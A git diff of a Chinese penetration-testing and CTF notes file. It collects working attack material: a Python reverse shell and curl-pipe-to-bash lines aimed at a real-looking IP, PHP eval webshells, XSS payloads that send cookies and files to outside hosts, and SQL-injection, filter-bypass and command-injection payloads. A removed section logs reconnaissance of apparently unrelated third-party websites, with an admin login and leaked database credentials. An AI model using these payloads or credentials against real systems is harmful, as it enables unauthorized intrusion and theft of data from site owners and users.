@@ -5,11 +5,16 @@ tags:  笔记
 abstract: 我听过的会忘掉，我看过的能记住，我做过的才真正明白。
 ---
 
-某大牛云，渗透测试本质上是信息收集。
+- 至少完整看完与练习好一本书
 
-每次比赛都当成查漏补缺，不会的赛后一定要搞懂。
++ 每次比赛都当成查漏补缺，不会的赛后一定要搞懂。
 
+- 至少过一遍，这都没过一遍，视野会局限
+- 行之说：「我没看过Python的书，却熟读官方手册……」
 
+- 1研究：研究东西，有足够洞察力，研究水准不错
+- 2研发：hack idea自己有魄力实现，不懂研发的黑客如同不会游泳的海盗
+- 3工程：研发出来的需要实战、需要工程化，否则只是玩具，而不能成为真的武器
 
 **吾日三省吾身**
 
@@ -34,7 +39,7 @@ curl 47.101.220.241|bash
 #coding:utf-8
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("47.101.220.241",8888)) #更改localhost为自己的外网ip,端口任意
+s.connect(("47.101.220.241",8888))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
@@ -43,9 +48,11 @@ p=subprocess.call(["/bin/sh","-i"])
 curl 795204849|python  # 这样不行？直接404
 curl 47.101.220.241|python
 
-<?php eval($_GET[1]);?>
+<?php eval($_POST[1]);?>
 
-php://filter/read=convert.base64-encode/resource=index.php
+'0123456789abcdefghijklmnopqrstuvwxyz!"#$&\'()*+,-./:;?@[\\]^`{|}~ <=>_'; // excluded: %
+
+php://filter/read=convert.base64-encode/resource=index
 php://filter/write=convert.base64-decode/resource=index.php
 ```
 
@@ -53,7 +60,91 @@ php://filter/write=convert.base64-decode/resource=index.php
 
 ## 每天学点新东西
 
-burp
+```javascript
+const fs = require('fs')
+const axios = require('axios')
+
+const fileList = fs.readdirSync('/Users/sx/website/src')
+
+const buildQuery = (data) => {
+    let ret = ''
+    for (let it in data) {
+      ret += encodeURIComponent(it) + '=' + encodeURIComponent(data[it]) + '&'
+    }
+    return ret
+}
+
+fileList.forEach(async file => {
+	const f = fs.readFileSync(`/Users/sx/website/src/` + file, 'utf-8')
+	const gets = /_GET\[["']?(.*?)["'?]\]/g
+	const posts = /_POST\[["']?(.*?)["'?]\]/g
+	let a, aa, b, bb
+	const g = {}
+	const p = {}
+	while ((a = gets.exec(f)) !== null) {
+		g[a[1]] = "echo 'fuckyou';"
+	}
+	while ((a = posts.exec(f)) !== null) {
+		p[a[1]] = "echo 'fuckyou';"
+	}
+	try {
+
+		const pp = await axios.post('http://127.0.0.1/src/' + file + '?' + buildQuery(g), p, {
+			headers: {
+				'Content-Type': 'application/x-www-form-urlencoded'
+			},
+			transformRequest: [buildQuery]
+		})
+		if (/fuckyou/.test(pp.data)) {
+			console.log(file)
+			process.exit(0)
+		}
+	} catch (e) {
+		// do nothing
+	}
+})
+```
+
+
+
+
+
+
+
+查看 phpinfo 有 open_basedir 限制，利用 glob:///* 绕过
+
+```php
+<?php
+printf('<b>open_basedir : %s </b><br />', ini_get('open_basedir'));
+$files = [];
+// normal files
+$it = new DirectoryIterator("glob:///*");
+foreach($it as $f) {
+    $files[] = $f->__toString();
+}
+// special files (starting with a dot(.))
+$it = new DirectoryIterator("glob:///.*");
+foreach($it as $f) {
+    $files[] = $f->__toString();
+}
+sort($files);
+var_dump($files);
+?>
+```
+
+
+
+
+
+windows 中的转义
+
+```
+代码中的 <> 符号，要用 ^^ 转义。比如 <?php 转义为 ^<^?php
+```
+
+
+
+Burp
 
 ```
 生成GET数据包：复制url -> 打开burp -> repeater -> 右键paste url as request
@@ -65,9 +156,19 @@ burp
 从数据包生成html表单（可测CSRF漏洞）：任意数据包页面 -> 右键engagement tools -> generate csrf poc
 ```
 
-
+### Trick
 
 ```php
+<?php
+$url = $_GET['url'];
+$parts = parse_url($url);
+if(empty($parts['host']) || $parts['host'] != 'localhost') {
+    exit('error');
+}
+readfile($url);
+?>
+url=file://localhost/etc/passwd
+
 <?php
 $text = $_GET['text'];
 if(preg_match('[<>?]', $text)) {
@@ -97,7 +198,7 @@ file_put_contents($_POST['filename'], $content);
 %09  => URL 编码
 ```
 
-
+*CTF readflag 无法手动提交
 
 ```php
 <?php
@@ -142,53 +243,6 @@ function runCommand($cmd) {
 }
 
 var_dump(runCommand('/readflag'));
-```
-
-
-
-
-
-如果我们想给web目录文件添加自定义waf脚本，其实可以用一条命令解决,以php为例：
-
-```shell
-find /var/www/html -type f -path "*.php" | xargs sed -i "s/<?php/<?php require_once('/tmp/waf.php');n/g"
-```
-
-ad 常用命令
-
-```shell
-ssh <-p 端口> 用户名@IP　　
-scp 文件路径  用户名@IP:存放路径　　　　
-tar -zcvf web.tar.gz /var/www/html/　　
-pkill -kill -t <用户tty>　　 　　
-ps aux | grep pid或者进程名　　　　
-#查看已建立的网络连接及进程
-netstat -antulp | grep EST
-#查看指定端口被哪个进程占用
-lsof -i:端口号 或者 netstat -tunlp|grep 端口号
-#结束进程命令
-kill PID
-killall <进程名>　　
-kill - <PID>　　
-#封杀某个IP或者ip段，如：.　　
-iptables -I INPUT -s . -j DROP
-iptables -I INPUT -s ./ -j DROP
-#禁止从某个主机ssh远程访问登陆到本机，如123..　　
-iptable -t filter -A INPUT -s . -p tcp --dport  -j DROP　　
-#备份mysql数据库
-mysqldump -u 用户名 -p 密码 数据库名 > back.sql　　　　
-mysqldump --all-databases > bak.sql　　　　　　
-#还原mysql数据库
-mysql -u 用户名 -p 密码 数据库名 < bak.sql　　
-find / *.php -perm  　　 　　
-awk -F:  /etc/passwd　　　　
-crontab -l　　　　
-#检测所有的tcp连接数量及状态
-netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn
-#查看页面访问排名前十的IP
-cat /var/log/apache2/access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -　　
-#查看页面访问排名前十的URL
-cat /var/log/apache2/access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -　
 ```
 
 
@@ -555,7 +609,7 @@ Golang
 
 ### 预备知识
 
-![img](https://qqadapt.qpic.cn/txdocpic/0/8f76487a3fe36749dfd454f8ac4d8c78/0)
+![img](http://qqadapt.qpic.cn/txdocpic/0/8f76487a3fe36749dfd454f8ac4d8c78/0)
 
 **Limit 注入**
 
@@ -578,13 +632,13 @@ like 5,BENCHMARK(5000000,SHA1(1)),1))))),1);
 
 **Order by 注入**
 
+由上表可看到，`order by` 后可接列名、表达式以及位置（数字）
+
 报错
 
 ```
 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))
 ```
-
-
 
 ```
 /?order=IF(1=1,name,price) 通过name字段排序
@@ -746,7 +800,6 @@ and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from inform
 
 + 结合函数报错信息，将函数插入到语句中
 + 将查询结果插入表中，再通过其他途径查看
-+ 
 
 
 
@@ -760,11 +813,18 @@ and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from inform
 
 ##### 布尔盲注
 
-正则猜解
-
 ```sql
 select (select user_pass from users where user_id = 1) regexp '^a'  -- 前往后匹配
 select (select user_pass from users where user_id = 1) regexp 'a$'  -- 后往前
+
+
+mysql> select 'abcd' > 'abc';
++----------------+
+| 'abcd' > 'abc' |
++----------------+
+|              1 |
++----------------+
+1 row in set (0.00 sec)
 ```
 
 ```
@@ -781,24 +841,26 @@ select (select user_pass from users where user_id = 1) regexp 'a$'  -- 后往前
 
 无显示回显，可在以前的基础上加入 `sleep()` 语句，若明显延迟，则注入成功
 
-`BENCHMARK(count,expr)`  执行 `count` 次的 `expr`，如 BENCHMARK(10000000,SHA(‘1’))
+`BENCHMARK(count,expr)`  执行 `count` 次的 `expr`，如 
 
-即使 `sleep` 和 `benchmark` 都被过滤了，但是我们依然可以通过让Mysql进行复杂运算，
+即使 `sleep` 和 `benchmark` 都被过滤了，但是我们依然可以通过让 Mysql 进行复杂运算，
 
 以达到延时的效果，比如可以用字段比较多的表来计算笛卡尔积
 
 ```sql
-select count(*) 
-from information_schema.columns A, 
-information_schema.columns B, 
-information_schema.columns C#
+select BENCHMARK(10000000,SHA(‘1’));
+select if(
+    1=0, 
+	(select count(*) from information_schema.columns A, information_schema.columns B),
+	0
+);
 ```
 
-还有 `get_lock()`
+还有 `get_lock()`，
 
 
 
-##### 利用注入写入后门
+##### 写入后门
 
 前提：开启 secure_file_priv，并且具有写的权限
 
@@ -833,7 +895,20 @@ and exists(select * from amdin)
 
 ### Bypass
 
-检测被过滤的关键词：
+#### 字段数
+
+```
+mysql> select * from users limit 1,1 into @,@;
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+mysql> select * from users limit 1,1 into @,@,@;
+Query OK, 1 row affected (0.00 sec)
+```
+
+
+
+multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF
+
+**检测被过滤的关键词：**
 
 + fuzz 一波 ASCII 码（特殊字符）
 + fuzz sql 所有关键词
@@ -841,7 +916,7 @@ and exists(select * from amdin)
 
 #### 空格
 
-- 使用注释绕过，/**/ (/\*1\*/)
+- 使用注释绕过，/**/ （information 中 o/\*\*/r 不能这么搞）
 
 - 使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用 ( ) 包围
 
@@ -880,7 +955,7 @@ select column_name from information_schema.tables where table_name="users"
 `users`的十六进制的字符串是`7573657273`。那么最后的sql语句就变为了：
 
 ```sql
-select column_name  from information_schema.tables where table_name=0x7573657273
+select column_name from information_schema.tables where table_name=0x7573657273
 ```
 
 **宽字节绕过**
@@ -891,17 +966,18 @@ select column_name  from information_schema.tables where table_name=0x7573657273
 
 #### 逗号
 
-`substr(), mid()` 里的逗号可用 `from for` 代替
+`substr()`, ` mid()` 里的逗号可用 `from for` 代替
 
 ```sql
-select substr(database(0 from 1 for 1);
-select mid(database(0 from 1 for 1);
+select substr(database() from -1);
+select substr(database() from 1 for 1);
+select mid(database() from 1 for 1);
 ```
 
 对于 `limit` 里面的逗号可以使用 `offset` 绕过
 
 ```sql
-select * from news limit 0,1  
+select * from news limit 0,1
 <=>
 select * from news limit 1 offset 0
 ```
@@ -935,7 +1011,6 @@ not => !
 
 ```
 //，-- , /**/, #, --+, -- -, ;,%00,--a
-U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user
 
 sele%ct IIS 服务器可以插入 %
 ```
@@ -966,9 +1041,9 @@ id=0e1union
 
 
 
-#### 表名等关键词
+#### 表名
 
-以information_schema.tables为例
+以 information_schema.tables 为例
 
 空格 `information_schema . tables`
 
@@ -983,7 +1058,73 @@ id=0e1union
 + 别名
 
 ```
-union (select 1,2,c from (select 1,2 c union select * from flag)b) limit 1,1
+mysql> select group_concat(a,b,c) from (select 1 as a,2 as b,3 as c union (select * from users)) as d;
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| group_concat(a,b,c)                                                                                                                                                                                  |
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 123,1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4 |
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+
+
+
+mysql> select (select 1)a,(select 2)b,(select 3)c,(select 4)d;
++---+---+---+---+
+| a | b | c | d |
++---+---+---+---+
+| 1 | 2 | 3 | 4 |
++---+---+---+---+
+1 row in set (0.00 sec)
+
+mysql> select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d;
++---+---+---+---+
+| 1 | 2 | 3 | 4 |
++---+---+---+---+
+| 1 | 2 | 3 | 4 |
++---+---+---+---+
+1 row in set (0.00 sec)
+
+mysql> select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user;
++---+-------+----------+-------------+
+| 1 | 2     | 3        | 4           |
++---+-------+----------+-------------+
+| 1 | 2     | 3        | 4           |
+| 1 | admin | admin888 | 110@110.com |
+| 2 | test  | test123  | 119@119.com |
+| 3 | cs    | cs123    | 120@120.com |
++---+-------+----------+-------------+
+4 rows in set (0.01 sec)
+
+mysql> select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user)e;
++-------------+
+| 4           |
++-------------+
+| 4           |
+| 110@110.com |
+| 119@119.com |
+| 120@120.com |
++-------------+
+4 rows in set (0.03 sec)
+
+mysql> select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user)e limit 1 offset 3;
+
++-------------+
+| 4           |
++-------------+
+| 120@120.com |
++-------------+
+1 row in set (0.01 sec)
+
+mysql> select * from user where id=1 union select (select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d
+union select * from user)e limit 1 offset 3)f,(select 1)g,(select 1)h,(select 1)i;
++-------------+----------+----------+-------------+
+| id          | username | password | email       |
++-------------+----------+----------+-------------+
+| 1           | admin    | admin888 | 110@110.com |
+| 120@120.com | 1        | 1        | 1           |
++-------------+----------+----------+-------------+
+2 rows in set (0.04 sec)
 ```
 
 + 变量
@@ -998,61 +1139,54 @@ union (select 1,2,c from (select 1,2 c union select * from flag)b) limit 1,1
 
 #### 等号
 
-使用 `like 、rlike 、regexp` 或者  `< , >`
+like rlike regexp < , >  in
+
+```
+# in
+mysql> select * from users where id in (1,3,6);
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
+|  3 | Dummy    | p@ssword |
+|  6 | superman | genious  |
++----+----------+----------+
+3 rows in set (0.00 sec)
+
+mysql> select * from users where username in ('Dumb', 'Dummy');
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
+|  3 | Dummy    | p@ssword |
++----+----------+----------+
+2 rows in set (0.00 sec)
+```
+
+
+
+#### information
+
+MySQL（5.7+）在其自带的 mysql 库中，新增了 innodb_table_stats 和 innodb_index_stats 这两张日志表。如果数据表的引擎是 innodb ，则会在这两张表中记录表、键的信息 。
 
 
 
 ### 杂项
 
-sqlmap 中`--file-read`参数，可以读取服务器端任意文件
+MongoDB 注入
 
-```shell
-python sqlmap -u "127.0.0.1/index.php?id=1 %df'" --file-read="./index.php"
+利用正则：找到y开头的name `db.items.find({name: {$regex: "^y"}})`
+
+一些payload
+
+1. `?login[$regex]=^&password[$regex]=^`
+2. `?login[$not][$type]=1&password[$not][$type]=1`
+
+```sql
+?id=1 RLIKE sleep((select 0.6*count(*) from (select * from(select 1 as a)t1 join(select 1 as b)t2 join(select 1 as c)t3 join(select 1 as d)t4 union/**/select * from flag limit 1 offset 1)x where d like binary 'flag{69c497323202ef9944c36b5e15516ad4}'))%23
 ```
 
-```
--u 单个URL -m xx.txt 多个URL
--d "mysql://user:password@10.10.10.137:3306/dvwa"  作为服务器客户端，直接连接数据库
---data post/get都适用
--p 指定扫描的参数
--r 读取文件
--f 指纹信息
---tamper 混淆脚本，用于应用层过滤
---cookie --user-agent --host等等http头的修改
---threads 并发线程 默认为1
---dbms MySQL<5.0> 指定数据库或版本
 
-–level=LEVEL 执行测试的等级（1-5，默认为 1）
-–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险
-–current-db / 获取当前数据库名称
-–dbs 枚举数据库管理系统数据库
-–tables 枚举 DBMS 数据库中的表
-–columns 枚举 DBMS 数据库表列
--D DB 要进行枚举的数据库名
--T TBL 要进行枚举的数据库表
--C COL 要进行枚举的数据库列
--U USER 用来进行枚举的数据库用户
-```
-
-确定字段数：order by n，select 1,2,…,n
-
-确定显示位：select 1,2,3,4,5 ，然后看显示哪个数字，之后的查询语句最好用@或者NULL，防止数据类型不匹配而造成的测试失败，即 `select @, @, NULL`
-
-[preg_match()](http://php.net/manual/zh/reference.pcre.pattern.modifiers.php)
-
-+ i ==> 大小写不敏感
-+ m ==> 可多行匹配
-+ s ==> `.`匹配所有字符，包括换行符
-+ x ==> 
-
-**思路**
-
-+   简单注入，手工或sqlmap跑
-+   判断注入点，是否是http头注入？是否在图片处注入
-+   判断注入类型
-+   利用报错信息注入
-+   尝试各种绕过过滤的方法
-+   查找是否是通用某模板存在的注入漏洞，比如 ThinkPHP 3.2
 
 **Tricks**
 
@@ -1094,6 +1228,7 @@ gbk 双字节编码：一个汉字用两个字节表示，首字节都应 0x81-0
 Access 是以单文件，mdb 格式，以表的形式存在，所以数据库也就只有一个文件，只能靠暴力猜解。
 
 > Access  ->  表名  ->  列名  ->  数据
+
 
 
 ## XSS
@@ -1153,8 +1288,10 @@ x.open("POST","request.php",true);
 x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
 x.send("url=file:///var/www/html/config.php");
 
-document.location='http://vps_ip?cookie'+document.cookie
+// 带 cookie
+document.location='http://47.101.220.241:8001?cookie'+document.cookie
 
+// 带文件
 <script>fetch('exec.php',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'command='+encodeURIComponent('curl xss.zsxsoft.com:23457 -F"a=@/flag.txt"')+'&exec=1'}).then(p=>p.text()).then(p=>fetch('main.php',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'comment='+p}))</script>
 
 <iframe srcdoc="<script>fetch('exec.php',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'command='+encodeURIComponent('')}).then(p=>p.text()).then(p=>fetch('main.php',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'comment='+p}))</script> "></iframe>
@@ -1322,7 +1459,7 @@ XSS窃取cookie
 **`details`**
 
 ```html
-<details ontoggle="alert('xss');">
+<details ontoggle="alert(1);">
     
 使用 open 属性触发 ontoggle 事件，无需用户触发
 <details open ontoggle="alert('xss');">
@@ -1491,25 +1628,25 @@ base64绕过
 
 **使用IP**
 
-1.十进制IP
+十进制
 
 ```html
 <img src="x" onerror=document.location=`http://2130706433/`>
 ```
 
-2.八进制IP
+八进制
 
 ```html
 <img src="x" onerror=document.location=`http://0177.0.0.01/`>
 ```
 
-3.hex
+hex
 
 ```html
 <img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
 ```
 
-4.html标签中用`//`可以代替`http://`
+html 标签中用`//`可以代替`http://`
 
 ```html
 <img src="x" onerror=document.location=`//www.baidu.com`>
@@ -1558,12 +1695,16 @@ alert`1`
 <script>alert(/adkddfasdffaasdfa/)</script>
 ```
 
-
-
-当 = ( ) ; : 被过滤时
+ = ( ) ; : 被过滤，用 HTML 编码
 
 ```html
-<svg><script>alert&#40/1/&#41</script> // 通杀所有浏览器
+<svg><script>alert&#40/1/&#41</script>  // 通杀所有浏览器
+<svg><script>prompt&#x28;1)<b>  // Firefox
+<svg><script>prompt&#40;1)</script>  // Chrome
+    
+// ES6
+<script>eval.call`${'prompt\x281)'}`</script>
+<script>prompt.call`${1}`</script>
 ```
 
 ### 杂项
@@ -1666,7 +1807,7 @@ Content-Security-Policy: default-src 'self'; script-src 'self';
 
 ## 命令执行
 
-#### 直接执行代码
+### 直接执行代码
 
 PHP 中有不少可以直接执行代码的函数。
 
@@ -1681,7 +1822,7 @@ escapeshellcmd();
 pcntl_exec();
 ```
 
-#### preg_replace( ) 代码执行
+preg_replace( ) 代码执行
 
 preg_replace() 的第一个参数如果存在 `/e` 模式修饰符，则允许代码执行。
 
@@ -1783,11 +1924,11 @@ rev flag
 paste ./flag.txt /etc/passwd
 ```
 
-#### Bypass
+### Bypass
 
-**多条命令**
+#### 多条命令
 
-```
+```shell
 %0a、%0d    换行符与回车符
 |           第一条命令结果作为第二条命令的输入
 ||          第一条执行失败，执行第二条命令
@@ -1799,10 +1940,17 @@ echo 666`date` => 666Tue 14 May 2019 07:15:23 AM EDT
 
 # Windows
 Copy %0a
+
 %1a - 一个神奇的角色，作为.bat文件中的命令分隔符
+<?php
+    $command = 'dir '.$_POST['dir'];
+    $escaped_command = escapeshellcmd($command);
+    file_put_contents('out.bat',$escaped_command);
+    system('out.bat');
+?>
 ```
 
-**绕过 escapeshellcmd**
+#### 绕过 escapeshellcmd
 
 + win 下执行 bat
 
@@ -1821,7 +1969,7 @@ system('out.bat');
 dir=../ %1a whoami
 ```
 
-**空格过滤**
+#### 空格
 
 + ${IFS}
 
@@ -1839,7 +1987,7 @@ cat<>flag
 cat<flag
 ```
 
-**黑名单绕过**
+#### 黑名单绕过
 
 + 拼接
 
@@ -1944,10 +2092,10 @@ uid=1000(wywwzjj) gid=1000(wywwzjj) groups=1000(wywwzjj)
 $ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
-$ echo $PATH| cut -c 1
+$ echo $PATH|cut -c 1
 /
 
-$ echo $PATH| cut -c 1-4
+$ echo $PATH|cut -c 1-4
 /usr
 ```
 
@@ -1956,7 +2104,7 @@ $ echo $PATH| cut -c 1-4
 - ${IFS} 对应 内部字段分隔符
 - ${9} 对应 空字符串
 
-**无回显**
+#### 无回显
 
 + 弹 shell
 
@@ -1986,7 +2134,7 @@ dns请求：
 for /F %x in ('whoami') do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%x'));$b=New-Object System.Net.WebClient;$b.DownloadString('http://xxx.ceye.io/'+$a);
 ```
 
-**长度限制**
+#### 长度限制
 
 + 文件构造（参考橘子那个 hitcon）
 
@@ -1999,6 +2147,11 @@ for /F %x in ('whoami') do powershell $a=[System.Convert]::ToBase64String([Syste
 
 - [shelling](https://github.com/ewilded/shelling)
 
+### 参考链接
+
+[巧用命令注入的 N 种姿势](https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw)
+
+[https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/](https://chybeta.github.io/2017/08/15/命令执行的一些绕过技巧/)
 
 
 ## 文件相关
@@ -2215,7 +2368,7 @@ if __name__ == "__main__":
 
 除此之外，这个题的关键就看 file_put_contents 和后面的 unlink、file_exists 有什么区别。
 
-查看源码能发现，php读取、写入文件，都会调用 php_stream_open_wrapper_ex 来打开流，而判断文件存在、重命名、删除文件等操作则无需打开文件流。
+查看源码能发现，PHP 读取、写入文件，都会调用 php_stream_open_wrapper_ex 来打开流，而判断文件存在、重命名、删除文件等操作则无需打开文件流。
 再跟一跟 php_stream_open_wrapper_ex 会发现，php 最后会使用 tsrm_realpath() 将 filename 标准化成一个绝对路径。而文件删除等操作则不会，这就是二者的区别。
 
 ![](<https://images.zsxq.com/FgrtzZGHdtl2tOVHcTcPfQjoifqk?e=1906272000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:nOCUP5n_a3yeCy9N0nUXKpX_g2U=>)
@@ -2359,6 +2512,73 @@ print_r(scandir(dirname(__FILE__) . "/../"));
 
 
 ## 流量分析
+
+
+
+## AWD
+
+不死马
+
+```
+
+```
+
+
+
+
+
+杀不死马
+
+```shell
+ps aux | grep www-data | awk '{print $2}' | xargs kill
+
+# 再创建一个和不死马生成的马名字一样的文件夹
+```
+
+
+
+如果我们想给web目录文件添加自定义waf脚本，其实可以用一条命令解决,以php为例：
+
+```shell
+find /var/www/html -type f -path "*.php" | xargs sed -i "s/<?php/<?php require_once('/tmp/waf.php');n/g"
+```
+
+ad 常用命令
+
+```shell
+ssh <-p 端口> 用户名@IP　　
+scp 文件路径  用户名@IP:存放路径　　　　
+tar -zcvf web.tar.gz /var/www/html/　　
+pkill -kill -t <用户tty>　　 　　
+ps aux | grep pid或者进程名　　　　
+#查看已建立的网络连接及进程
+netstat -antulp | grep EST
+#查看指定端口被哪个进程占用
+lsof -i:端口号 或者 netstat -tunlp|grep 端口号
+#结束进程命令
+kill PID
+killall <进程名>　　
+kill - <PID>　　
+#封杀某个IP或者ip段，如：.　　
+iptables -I INPUT -s . -j DROP
+iptables -I INPUT -s ./ -j DROP
+#禁止从某个主机ssh远程访问登陆到本机，如123..　　
+iptable -t filter -A INPUT -s . -p tcp --dport  -j DROP　　
+#备份mysql数据库
+mysqldump -u 用户名 -p 密码 数据库名 > back.sql　　　　
+mysqldump --all-databases > bak.sql　　　　　　
+#还原mysql数据库
+mysql -u 用户名 -p 密码 数据库名 < bak.sql　　
+find / *.php -perm  　　 　　
+awk -F:  /etc/passwd　　　　
+crontab -l　　　　
+#检测所有的tcp连接数量及状态
+netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn
+#查看页面访问排名前十的IP
+cat /var/log/apache2/access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -　　
+#查看页面访问排名前十的URL
+cat /var/log/apache2/access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -　
+```
 
 
 
@@ -2705,6 +2925,8 @@ nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.x
 #### 一、主机发现
 
 ```shell
+nmap --top-ports=100 -T4 -n -Pn
+
 1. 全面扫描/综合扫描
 nmap -A 192.168.1.103
 
@@ -3641,86 +3863,4 @@ hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
 
 +   各种Web漏洞夹杂
 
-+   具有内网环境的真是渗透场景 
-
-
-
-
-
-## 日站记录
-
-http://2nto4x.ijhz.cn/luodi/xiaoshuo/?pageid=20%20and%201=0
-
-https://market.hzhangmeng.com/landingPage/register-keledai.html?owner=keledai&channelCode=azuo    
-
-后台http://139.196.127.175:8090/login.html  账号密码一样 azuo
-
-
-
-### 信息收集
-
-+ IP：154.80.253.139
-+ 可能域名：0539y.com
-+ Server: Microsoft-IIS/10.0
-+ X-Powered-By: ASP.NET
-
-+ nmap 扫描
-
-```shell
-PORT     STATE SERVICE
-21/tcp   open  ftp
-80/tcp   open  http
-3306/tcp open  mysql
-Device type: general purpose
-Running: Linux 2.4.X, Microsoft Windows XP|7|2012
-OS CPE: cpe:/o:linux:linux_kernel:2.4.37 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012
-OS details: DD-WRT v24-sp2 (Linux 2.4.37), Microsoft Windows XP SP3, Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012
-```
-
-+ Nikto 扫描
-
-```shell
-nikto -h http://example.com -output ~/nikto.html -Format htm
-# 结果
-http://154.80.253.139/phpMyAdmin/index.php
-http://154.80.253.139:80/5cMlHAOg.aspx  # 暂时连不上
-http://154.80.253.139/phpMyAdmin/doc/html/index.html  # 偶然发现
-```
-
-+ 信息收集网站
-
-```shell
-https://dnslytics.com/ip/154.80.253.139
-
-# 旁站
-bjshuxue.com	
-'dbuser' => 'user_bjshuxue',
-'dbpw' => 'cdma2008'
-ftp://154.80.253.139/  # 需要密码连接
-
-pinkewang.com
-# 数据库信息
-[INFO] the back-end DBMS is Microsoft Access
-web server operating system: Windows 10 or 2016
-web application technology: ASP.NET, Microsoft IIS 10.0, ASP
-back-end DBMS: Microsoft Access
-
-i03.net	
-tzsiss.com.cn	
-cz-huatian.com	
-nplxs.com	
-wangmin.name	
-4006080.com	
-flyemail.cn	
-zj5156.org
-
-# 邮箱 2018-08-05
-mail.jianuo2.xyz
-mail.taiyangyy.top
-```
-
-+ 目录扫描
-
-```shell
-http://154.80.253.139/phpMyAdmin/db_create.php  # 与 index.php 同界面
-```
++   具有内网环境的真实渗透场景 
